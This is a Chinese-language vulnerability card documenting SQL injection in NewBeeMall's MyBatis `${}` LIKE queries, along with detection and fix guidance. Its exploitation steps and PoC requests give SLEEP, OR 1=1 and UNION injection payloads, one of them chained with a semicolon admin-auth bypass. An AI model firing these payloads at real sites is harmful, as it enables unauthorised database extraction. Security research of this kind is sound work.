---
id: web-generic-sqli-newbeemall-mybatis-dollar-goodsname-keyword
title: NewBeeMall MyBatis ${} 两处注入：后台 goodsName 与前台 keyword 直拼 LIKE
type: scenario
domain: web
path: web/generic/sqli
technique: mybatis-dollar-brace-like-injection
aliases:
- NewBeeMall SQL 注入
- MyBatis ${goodsName}
- MyBatis ${keyword}
- LIKE CONCAT 注入
- /goods/list 注入
- /search 注入
- newbee-mall sqli
tags:
- sqli
- mybatis
- java
- spring
- like-injection
- newbee-mall
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V51
  verified_at: '2026-11-05T09:08:40+08:00'
  notes: 已对照原文与图19-32核对：NewBeeMallGoodsMapper.xml findNewBeeMallGoodsList 的 ${goodsName}（admin NewBeeMallGoodsController#list，@RequestParam Map）与 findNewBeeMallGoodsListBySearch 的 ${keyword}（mall GoodsController#searchPage，trim 后封装 PageQueryUtil）两处 LIKE 直拼均与卡一致；图19 依赖为 mybatis-spring-boot-starter 1.3.2，已把卡内“MyBatis 1.3.2”修正为该 starter 版本。未验证点：文章未给注入 payload/回显，后台点截图实际为 /admin/goods/list（卡内 /;/admin/goods/list 为结合分号绕过的构造），未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

NewBeeMall 的 MyBatis Mapper 在两处 LIKE 查询中使用 `${}` 字符串拼接：后台 `findNewBeeMallGoodsList` 的 `${goodsName}`（经 `GET /goods/list` 的 `@RequestParam Map` 传入）与前台 `findNewBeeMallGoodsListBySearch` 的 `${keyword}`（经 `GET /search` 传入）；`${}` 会把参数原样插入 SQL，攻击者可用单引号闭合 `CONCAT('%','...','%')` 实施注入，后台点还可经 `/;/admin/goods/list` 分号绕过鉴权。

## 原理

- MyBatis 的 `#{}` 走预编译参数，`${}` 在 SQL 解析阶段做字符串替换，等价于手工拼接，不转义、不预编译。
- 注入点一（后台）：`NewBeeMallGoodsMapper.xml` 的 `findNewBeeMallGoodsList`：`and goods_name like CONCAT('%', '${goodsName}', '%')`。控制器 `NewBeeMallGoodsController#list` 为 `@GetMapping("/goods/list") @ResponseBody public Result list(@RequestParam Map<String,Object> params)`，把整个参数 Map 交给 `PageQueryUtil`，`goodsName` 完全可控；该控制器在 `admin` 包下，正常需后台登录，但存在 `/;/admin/index` 分号鉴权绕过（见关联卡），因此未登录也可达。
- 注入点二（前台）：`findNewBeeMallGoodsListBySearch`：`(goods_name like CONCAT('%','${keyword}','%') or goods_intro like CONCAT('%','${keyword}','%'))`。前台 `GoodsController#searchPage` 为 `@GetMapping({"/search", "/search.html"})`，从 URL 参数取 `keyword`，仅做 `trim()` 和空值判断，随后封装进 `PageQueryUtil` 调用 `searchNewBeeMallGoods`；无需登录。
- 注入构造：`CONCAT('%','${x}','%')` 中 `${x}` 处于单引号内，可用 `'` 闭合后追加 `OR 1=1-- `、`AND SLEEP(5)-- `、`UNION SELECT ...` 等；MySQL 下注释用 `-- ` 或 `#`。
- 危害：前台注入无需登录即可拖库/盲注；后台注入结合鉴权绕过同样可达。文章给出了完整的数据流与请求，但未附注入 payload 与回显，故 confidence 定为 medium。

## 触发条件

- 目标为 NewBeeMall（文章环境 mybatis-spring-boot-starter 1.3.2）。
- 后台 `/admin/goods/list` 或前台 `/search` 可达，`goodsName`/`keyword` 参数可控。
- 数据库为 MySQL（文章 Mapper 使用 CONCAT，符合 MySQL 语法）。
- 后台点需 `/;/admin/goods/list` 分号绕过生效（见关联卡）。

## 利用步骤

1. 前台：请求 `/search?keyword=test'`，观察报错/页面变化，确认单引号闭合。
2. 用 `keyword=test' AND SLEEP(5)-- ` 做时间盲注，或用 `keyword=test' OR 1=1-- ` 观察返回商品数量变化。
3. 进一步用 `UNION SELECT`/布尔/时间盲注提取库名、表名、管理员哈希。
4. 后台：用 `/;/admin/goods/list?page=1&limit=20&goodsName=test' AND SLEEP(5)-- ` 复现同一注入（需先确认分号绕过可用）。
5. 注意 URL 编码与 `--` 后空格。

## PoC

```http
GET /search?keyword=test'%20AND%20SLEEP(5)--%20 HTTP/1.1
Host: target.example:28089
```

```text
# 预期：若注入成立，响应延迟约 5 秒；正常 keyword=test 为毫秒级。
# 也可用 keyword=test' OR 1=1-- 观察返回商品数量是否变为全表。
```

```http
GET /;/admin/goods/list?page=1&limit=20&goodsName=test'%20AND%20SLEEP(5)--%20 HTTP/1.1
Host: target.example:28089
```

```text
# 后台注入点：依赖 /;/admin/... 分号鉴权绕过；未登录即可到达 list 方法。
```

## 变体与关联

- 变体：`goodsName`/`keyword` 还可尝试 `ORDER BY`、`UNION`、报错注入；若应用关闭错误回显则用时间盲注。
- 变体：同一 Mapper 中其他 `${}` 位置（文章搜索到 4 处 `${`）均需审计。
- 关联：[[web-generic-auth-newbeemall-semicolon-admin-bypass]]（后台注入点的鉴权绕过）；[[web-generic-sqli-xiahuia-erp-account-search-json-like-injection]]（MyBatis LIKE '%${name}%' 时间盲注的同类模式）；[[web-generic-sqli-roothub-mybatis-like-dollar-brace]]（MyBatis ${} LIKE 注入）。
- 边界：文章只展示了 `goodsName=` 空值与正常搜索请求，未给出注入 payload/回显；注入点由 Mapper `${}` 与可控参数确认，实际可利用性需按目标过滤/WAF 验证。

## 检测与防御

- 检测：全局搜索 Mapper XML 中的 `${`，逐处确认参数来源；监控 `goodsName`/`keyword` 中的单引号、`SLEEP`、`UNION`、`--` 等特征；关注 `/search` 的异常长耗时请求。
- 修复：将 `${goodsName}`/`${keyword}` 改为 `#{}` 预编译参数；LIKE 查询使用 `CONCAT('%', #{keyword}, '%')`；若必须动态拼接，使用白名单校验。
- 加固：MyBatis 层禁止 `${}` 或做静态扫描拦截；数据库账号最小权限；WAF 拦截注入特征；修复后台鉴权绕过，减少后台注入面。
